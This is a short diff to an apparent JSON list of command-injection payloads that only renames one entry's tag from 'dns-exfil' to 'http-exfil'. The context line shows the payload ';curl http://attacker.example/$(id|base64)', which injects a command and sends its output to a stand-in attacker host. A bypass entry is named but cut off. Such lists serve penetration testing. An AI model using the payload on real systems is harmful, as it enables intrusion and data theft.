@@ -84,7 +84,7 @@
       "label": "Out-of-band HTTP callback",
       "payload": ";curl http://attacker.example/$(id|base64)",
       "notes": "Sends base64 output over HTTP; works when DNS is filtered but outbound HTTP is allowed.",
-      "tags": ["oob", "dns-exfil", "linux"]
+      "tags": ["oob", "http-exfil", "linux"]
     },
     {
       "id": "ifs-space-bypass",
